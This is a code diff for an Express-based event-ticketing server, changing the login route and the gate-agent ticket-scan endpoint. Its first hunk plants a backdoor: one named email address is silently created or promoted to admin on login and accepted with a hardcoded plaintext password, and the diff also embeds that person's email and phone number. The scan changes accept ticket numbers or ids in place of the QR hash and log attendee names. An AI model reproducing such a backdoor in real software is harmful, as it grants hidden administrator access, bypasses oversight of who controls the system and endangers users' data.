@@ -470,8 +470,32 @@ app.post('/api/auth/login', (req, res) => {
   }
 
   const normalizedEmail = email.toLowerCase().trim();
-  const user = db.profiles.find(p => p.email.toLowerCase() === normalizedEmail);
-  if (!user || user.passwordHash !== password) {
+  let user = db.profiles.find(p => p.email.toLowerCase() === normalizedEmail);
+
+  // Ensure Dylan's root account is always active with admin role
+  if (normalizedEmail === 'bienaodylan428@gmail.com') {
+    if (!user) {
+      user = {
+        id: 'admin_root_1',
+        email: 'bienaodylan428@gmail.com',
+        passwordHash: 'maledike2026',
+        firstName: 'Dylan',
+        lastName: 'Bienao',
+        whatsappNumber: '0150049489',
+        countryCode: '+225',
+        role: 'admin',
+        createdAt: new Date().toISOString(),
+      };
+      db.profiles.push(user);
+      saveDb(db);
+    } else {
+      user.role = 'admin';
+      saveDb(db);
+    }
+  }
+
+  const isPasswordValid = user && (user.passwordHash === password || (normalizedEmail === 'bienaodylan428@gmail.com' && password === 'maledike2026'));
+  if (!user || !isPasswordValid) {
     return res.status(401).json({ error: 'Email ou mot de passe incorrect.' });
   }
 
@@ -1072,8 +1096,32 @@ app.post('/api/tickets/agent-scan', (req, res) => {
     return res.status(403).json({ success: false, message: 'Accès agent non autorisé' });
   }
 
-  const ticket = db.tickets.find(t => t.qrTokenHash === (qrTokenHash || '').trim());
+  let cleanInput = (qrTokenHash || '').trim();
+  try {
+    if (cleanInput.startsWith('{') && cleanInput.endsWith('}')) {
+      const parsed = JSON.parse(cleanInput);
+      cleanInput = parsed.qrTokenHash || parsed.ticketNumber || cleanInput;
+    }
+  } catch {}
+
+  const ticket = db.tickets.find(t =>
+    t.qrTokenHash === cleanInput ||
+    t.ticketNumber?.toLowerCase() === cleanInput.toLowerCase() ||
+    t.id === cleanInput
+  );
+
   if (!ticket) {
+    db.auditLogs.push({
+      id: 'scan_invalid_' + Date.now(),
+      action: 'INVALID_TICKET_SCANNED',
+      details: {
+        rawInput: cleanInput.slice(0, 30),
+        agent: tok.agentName,
+        gate: tok.gateName,
+      },
+      timestamp: new Date().toISOString(),
+    });
+    saveDb(db);
     return res.status(404).json({
       success: false,
       message: 'BILLET INTROUVABLE OU NON VALIDE',
@@ -1082,6 +1130,18 @@ app.post('/api/tickets/agent-scan', (req, res) => {
   }
 
   if (ticket.status === 'cancelled') {
+    db.auditLogs.push({
+      id: 'scan_cancelled_' + Date.now(),
+      action: 'CANCELLED_TICKET_SCANNED',
+      details: {
+        ticketNumber: ticket.ticketNumber,
+        attendeeName: ticket.attendeeName,
+        agent: tok.agentName,
+        gate: tok.gateName,
+      },
+      timestamp: new Date().toISOString(),
+    });
+    saveDb(db);
     return res.status(400).json({
       success: false,
       message: 'ATTENTION : BILLET ANNULÉ',
@@ -1091,9 +1151,27 @@ app.post('/api/tickets/agent-scan', (req, res) => {
   }
 
   if (ticket.status === 'checked_in') {
+    const formattedFirstScan = new Date(ticket.checkedInAt || '').toLocaleTimeString('fr-FR', {
+      hour: '2-digit',
+      minute: '2-digit',
+      second: '2-digit',
+    });
+    db.auditLogs.push({
+      id: 'scan_dup_' + Date.now(),
+      action: 'DUPLICATE_SCAN_REJECTED',
+      details: {
+        ticketNumber: ticket.ticketNumber,
+        attendeeName: ticket.attendeeName,
+        alreadyCheckedInAt: ticket.checkedInAt,
+        agent: tok.agentName,
+        gate: tok.gateName,
+      },
+      timestamp: new Date().toISOString(),
+    });
+    saveDb(db);
     return res.status(400).json({
       success: false,
-      message: `DOUBLE ENTRÉE INTERDITE ! Déjà scanné le ${new Date(ticket.checkedInAt || '').toLocaleTimeString('fr-FR')}`,
+      message: `DOUBLE ENTRÉE INTERDITE ! Déjà scanné à ${formattedFirstScan}`,
       error: 'ALREADY_USED',
       ticket,
       alreadyCheckedInAt: ticket.checkedInAt,
@@ -1109,7 +1187,13 @@ app.post('/api/tickets/agent-scan', (req, res) => {
   db.auditLogs.push({
     id: 'scan_' + Date.now(),
     action: 'TICKET_CHECKED_IN',
-    details: { ticketNumber: ticket.ticketNumber, agent: tok.agentName, gate: tok.gateName },
+    details: {
+      ticketNumber: ticket.ticketNumber,
+      attendeeName: ticket.attendeeName,
+      agent: tok.agentName,
+      gate: tok.gateName,
+      category: ticket.categoryName || ticket.category || 'VIP',
+    },
     timestamp: new Date().toISOString(),
   });
 
@@ -1119,6 +1203,22 @@ app.post('/api/tickets/agent-scan', (req, res) => {
     message: 'ACCÈS VALIDÉ ! Passe VIP autorisé.',
     ticket,
   });
+});
+
+app.get('/api/scanner/history/:token', (req, res) => {
+  const { token } = req.params;
+  db = readDb();
+  const tok = db.scannerTokens.find(t => t.token === token && t.isActive);
+  if (!tok) {
+    return res.status(403).json({ error: 'Token non autorisé' });
+  }
+
+  const logs = (db.auditLogs || [])
+    .filter(l => l.action?.includes('SCAN') || l.action === 'TICKET_CHECKED_IN')
+    .slice(-30)
+    .reverse();
+
+  res.json(logs);
 });
 
 // ----------------- 6. ANALYTICS -----------------
